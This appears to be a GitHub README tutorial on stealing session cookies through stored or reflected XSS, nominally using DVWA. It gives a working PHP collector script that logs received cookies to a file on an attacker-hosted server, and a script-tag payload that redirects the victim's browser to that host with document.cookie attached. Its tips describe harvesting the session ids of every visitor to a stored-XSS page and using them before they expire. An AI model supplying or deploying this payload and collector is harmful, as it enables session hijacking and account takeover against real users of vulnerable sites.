# CookieStealing
How you can steal cookies using XSS Stored/Reflected



**************************************************Cross Site Scripting**********************************************************



First select your target i m using DVWA for educational purpose

1-Select the XSS bug or find the (XSS)vulnuerable portion in a web application.

2-First of all create a php script and copy the paste as follows:

	<?php
	$cookie=$_GET['cookie'];
	$f=fopen("cookie.txt","w");
	fwrite($f,$cookie);
	fclose($f);
	echo("Done");
	?>

	(Host this file either in your local host or a purchased domain)

3-Open the input field of the web application which is vulnerable to XSS and write the following javascript code :
	
	<script>window.location="(Link of your php script)?cookie="+document.cookie;</script>
4- Press go 

5- Then you will see that a cookie.txt file (same directory where you php file exist).Open that file here u will see that there exist the session id 
	now this is the session id .Now its upto u how u can use it!!


***********************************Useful tips**************************************

1-All the screenshot are uploaded for better understanding

2-Use this process when the data in input field is stored in database so when the new user vosit that exploit page u will get his/her session id too.

3-Use the session id before the session expires.

